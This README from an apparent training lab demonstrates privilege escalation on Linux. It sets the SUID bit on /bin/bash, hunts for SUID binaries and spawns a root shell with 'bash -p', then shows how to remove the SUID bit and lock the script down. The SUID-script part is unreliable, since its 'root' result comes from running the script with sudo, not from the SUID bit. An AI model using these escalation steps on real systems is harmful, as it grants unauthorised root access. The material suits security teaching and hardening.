# POC-TASKS
# 📌 Linux Security - Exploitation & Hardening (PoC)

This repository demonstrates **SUID misconfigurations** in Linux, including **exploitation and mitigation**.

---

## 🔹 **Task 4: SUID & Privilege Escalation**

This task demonstrates how **misconfigured SUID binaries** can be exploited for **privilege escalation** and how to **mitigate** such vulnerabilities.

---

## ✅ **Setup: Creating a Vulnerable SUID Environment**

### **1️⃣ Set SUID Bit on Bash (Dangerous!)**

```bash
# Grant SUID to Bash (Insecure!)
┌──(kali㉿kali)-[~]
└─$ sudo chmod u+s /bin/bash

# Verify SUID is set
┌──(kali㉿kali)-[~]
└─$ ls -l /bin/bash  
-rwsr-xr-x 1 root root 1298416 Oct 20 16:49 /bin/bash
```

### **2️⃣ Create a Root-Owned SUID Script**

```
# Create a root-owned script
┌──(kali㉿kali)-[~]
└─$ sudo nano /root/root_script.sh

# Paste the following inside the Text editor (nano)
(#!/bin/bash
echo "Running as: $(whoami)"
id)
# Save & exit, then make it executable

# Set SUID permission on the script
┌──(kali㉿kali)-[~]
└─$ sudo chmod 4755 /root/root_script.sh

# Verify permissions
┌──(kali㉿kali)-[~]
└─$ sudo ls -l /root/root_script.sh     
-rwsr-xr-x 1 root root 44 Mar 19 18:30 /root/root_script.sh
```

### **3️⃣Exploitation: Gaining Root Access**

```
## Find SUID binaries
┌──(kali㉿kali)-[~]
└─$ find / -perm -4000 2>/dev/null
/usr/lib/chromium/chrome-sandbox
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap .......

## Exploit SUID on Bash to Get Root Privileges
# Run Bash with SUID privilege
┌──(kali㉿kali)-[~]
└─$ /bin/bash -p

# Verify root access
┌──(kali㉿kali)-[~]
└─$ /bin/bash -p
bash-5.2# whoami
root

## Execute root owned script
bash-5.2# sudo /root/root_script.sh
Running as: root
uid=0(root) gid=0(root) groups=0(root)
```

### **4️⃣Mitigation: Fixing the Security Issues**
```
# Remove SUID from Bash
bash-5.2# sudo chmod -s /bin/bash

# Verify SUID is removed
bash-5.2# ls -l /bin/bash
-rwxr-xr-x 1 root root 1298416 Oct 20 16:49 /bin/bash

# Change ownership and restrict access
bash-5.2# sudo chown root:root /root/root_script.sh
bash-5.2# sudo chmod 700 /root/root_script.sh

# Verify permissions
bash-5.2# ls -l /root/root_script.sh
-rwx------ 1 root root 44 Mar 19 18:30 /root/root_script.sh
```
### **📌 Task 4 - Summary**  

| **Step**              | **Action**                                         | **Command**                                  |
|----------------------|-------------------------------------------------|---------------------------------------------|
| 🔹 **Setup**          | Set the SUID bit on `/bin/bash`                   | `sudo chmod u+s /bin/bash` |
|                      | Create a script running with root privileges       | `echo -e '#!/bin/bash\necho "Running as: $(whoami)"' | sudo tee /root/root_script.sh` |
|                      | Set SUID permission on the script                  | `sudo chmod 4755 /root/root_script.sh` |
|                      | Verify permissions                                 | `ls -l /bin/bash /root/root_script.sh` |
| 🔹 **Exploitation**   | Find SUID binaries                                | `find / -perm -4000 2>/dev/null` |
|                      | Exploit SUID on Bash to get root                   | `/bin/bash -p` |
|                      | Verify root access                                 | `whoami` |
|                      | Execute the root-owned script                      | `/root/root_script.sh` |
| 🔹 **Mitigation**     | Remove SUID from Bash                             | `sudo chmod -s /bin/bash` |
|                      | Restrict script execution to root only            | `sudo chmod 700 /root/root_script.sh` |
|                      | Verify permissions after mitigation                | `ls -l /bin/bash /root/root_script.sh` |

### **END-x-**
